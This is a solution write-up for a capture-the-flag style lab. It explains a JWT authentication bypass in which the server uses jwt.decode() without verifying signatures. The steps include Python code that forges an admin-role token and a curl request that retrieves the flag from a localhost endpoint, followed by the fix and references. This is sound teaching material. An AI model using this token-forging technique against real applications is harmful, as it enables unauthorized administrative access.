# Solution - Lab #1: Blind Trust

## Root Cause

`index.js` uses `jwt.decode(token)` to read the session on every authenticated request.
`jwt.decode()` is a convenience function that base64-decodes the payload without touching the signature.
The attacker controls the payload entirely.

The smoking gun:

```javascript
function getSession(req) {
  const token = req.cookies.session;
  if (!token) return null;
  try {
    return jwt.decode(token);   // never verifies
  } catch {
    return null;
  }
}
```

The fix would be `jwt.verify(token, SECRET)` - but that requires knowing the secret, which the attacker does not.

## Exploit Steps

### 1. Get a legitimate token

Login as any user (e.g. `alice`). The `session` cookie contains a HS256 JWT, e.g.:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
.eyJuYW1lIjoiYWxpY2UiLCJyb2xlIjoiYW5hbHlzdCIsImlhdCI6MTcxNTAwMDAwMH0
.SomHmacSignatureHere
```

### 2. Decode the payload

The middle segment is base64url-encoded JSON. Decode it:

```
{"name":"alice","role":"analyst","iat":1715000000}
```

### 3. Forge the payload

Change `role` to `admin`, re-encode:

```python
import base64, json

def b64url_enc(b):
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

payload = {"name": "alice", "role": "admin", "iat": 1715000000}
new_part = b64url_enc(json.dumps(payload, separators=(',',':')).encode())
```

### 4. Reassemble the token

Keep the original header and signature - neither is checked:

```
<original_header>.<new_payload>.<original_or_any_signature>
```

### 5. Capture the flag

```bash
curl http://localhost:3000/api/admin/users \
  -H "Cookie: session=<forged_token>"
```

Response:

```json
{
  "flag": "FLAG{bl1nd_trust_s1gn4tur3_n3v3r_ch3ck3d}",
  "users": [...]
}
```

## Automated PoC

```bash
pip install requests pwntools
python poc.py
```

## Takeaway

Always use `jwt.verify()` - never `jwt.decode()` - for authentication.
The difference is one word but the impact is total authentication bypass.

## References

- [Lab: JWT authentication bypass via unverified signature (PortSwigger)](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature) - Hands-on lab where the server never checks the signature at all
- [Lab: JWT authentication bypass via flawed signature verification (PortSwigger)](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification) - Lab exploiting a server that accepts tokens with an empty signature
- [jwt_tool (ticarpi)](https://github.com/ticarpi/jwt_tool) - Multi-purpose JWT attack toolkit for forging and replaying tokens
